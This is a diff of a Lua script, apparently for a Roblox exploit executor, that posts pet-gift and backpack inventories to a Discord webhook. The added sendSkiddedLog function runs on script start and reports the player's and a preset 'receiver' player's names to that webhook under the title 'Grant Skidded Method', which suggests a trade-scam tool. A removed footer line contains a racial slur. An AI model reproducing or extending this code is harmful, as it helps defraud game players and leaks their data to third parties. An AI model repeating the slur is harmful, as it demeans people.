@@ -25,27 +25,29 @@ local function getAgeInventory(player)
 	return inventory
 end
 
--- 📦 Format inventory into a clean bullet list
-local function formatInventory(inv)
+-- 🧾 Clean table formatter with aligned columns
+local function formatTable(inv)
 	local counts = {}
 	for _, name in ipairs(inv) do
 		local base = name:match("^(.-) %[[^%]]+%] %[[^%]]+%]$") or name
 		counts[base] = (counts[base] or 0) + 1
 	end
 
-	local lines = {}
-	local maxLines = 20
-	local shown = 0
+	local sorted = {}
 	for name, count in pairs(counts) do
-		table.insert(lines, string.format("• **%s** × %d", name, count))
-		shown += 1
-		if shown >= maxLines then
-			table.insert(lines, "_...and more_")
-			break
-		end
+		table.insert(sorted, {name = name, count = count})
+	end
+	table.sort(sorted, function(a, b) return a.name < b.name end)
+
+	local lines = {}
+	table.insert(lines, "Pet" .. string.rep(" ", 24 - 3) .. "Count")
+	for _, item in ipairs(sorted) do
+		local spacing = 25 - #item.name
+		local line = item.name .. string.rep(" ", spacing > 0 and spacing or 1) .. "× " .. item.count
+		table.insert(lines, line)
 	end
 
-	return #lines > 0 and table.concat(lines, "\n") or "_None_"
+	return "```" .. table.concat(lines, "\n") .. "```"
 end
 
 -- 🎁 Compare inventories to find newly added pets
@@ -68,33 +70,36 @@ local function getNewPets(oldInv, newInv)
 	end
 
 	local lines = {}
+	table.insert(lines, "Pet" .. string.rep(" ", 24 - 3) .. "Count")
 	for name, count in pairs(diff) do
-		table.insert(lines, string.format("• **%s** × %d", name, count))
+		local spacing = 25 - #name
+		local line = name .. string.rep(" ", spacing > 0 and spacing or 1) .. "× " .. count
+		table.insert(lines, line)
 	end
 
-	return #lines > 0 and table.concat(lines, "\n") or "_Nothing new_"
+	return #lines > 1 and "```" .. table.concat(lines, "\n") .. "```" or "_Nothing new_"
 end
 
 -- 🌐 Send or edit webhook message
 local function sendWebhook(oldInv, newInv, displayName)
 	local embed = {
 		{
-			title = "🎁 Trade Tracker",
-			description = string.format("**%s** has accepted a pet gift!", displayName),
+			title = "Trade Tracker",
+			description = string.format("%s has accepted a pet gift!", displayName),
 			color = 16753920,
 			fields = {
 				{
-					name = "✨ Newly Received Pets",
+					name = "Newly Received Pets",
 					value = getNewPets(oldInv, newInv)
 				},
 				{
-					name = "🎒 Backpack Contents",
-					value = formatInventory(newInv)
+					name = "Backpack Contents",
+					value = formatTable(newInv)
 				}
 			},
 			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
 			footer = {
-				text = "niggametamethod"
+				text = "gift tracker by @Lei"
 			}
 		}
 	}
@@ -109,16 +114,13 @@ local function sendWebhook(oldInv, newInv, displayName)
 		local messageId = getgenv().last_message_id
 
 		if messageId then
-			-- Edit existing message
-			local editUrl = webhookUrl .. "/messages/" .. messageId
 			req({
-				Url = editUrl,
+				Url = webhookUrl .. "/messages/" .. messageId,
 				Method = "PATCH",
 				Headers = { ["Content-Type"] = "application/json" },
 				Body = payload
 			})
 		else
-			-- Send new message
 			local response = req({
 				Url = webhookUrl,
 				Method = "POST",
@@ -132,14 +134,51 @@ local function sendWebhook(oldInv, newInv, displayName)
 				end)
 				if success and decoded and decoded.id then
 					getgenv().last_message_id = decoded.id
-				else
-					warn("⚠️ Webhook sent, but response not parseable:")
-					warn(response.Body)
 				end
 			end
 		end
 	end
 end
+
+-- 🧾 Initial webhook for Grant Skidded Log
+local function sendSkiddedLog()
+	local raw = getgenv().receiever
+	local receiver = typeof(raw) == "Instance" and raw or Players:FindFirstChild(raw or "")
+	if not receiver then return end
+
+	local embed = {
+		{
+			title = "Grant Skidded Method",
+			color = 16753920,
+			fields = {
+				{
+					name = "Trading",
+					value = string.format("%s ➜ %s", LocalPlayer.DisplayName, receiver.DisplayName)
+				}
+			},
+			timestamp = os.date("!%Y-%m-%dT%H:%M:%SZ"),
+			footer = { text = "gift tracker by @Lei" }
+		}
+	}
+
+	local payload = HttpService:JSONEncode({
+		username = "Lei",
+		embeds = embed
+	})
+
+	local webhookUrl = getgenv().webhook_url
+	if typeof(req) == "function" and typeof(webhookUrl) == "string" then
+		req({
+			Url = webhookUrl,
+			Method = "POST",
+			Headers = { ["Content-Type"] = "application/json" },
+			Body = payload
+		})
+	end
+end
+
+-- 🚀 Immediately send the skidded log on script start
+sendSkiddedLog()
 
 -- 👂 Listen for gift acceptance with debounce
 local debounceTime = 2
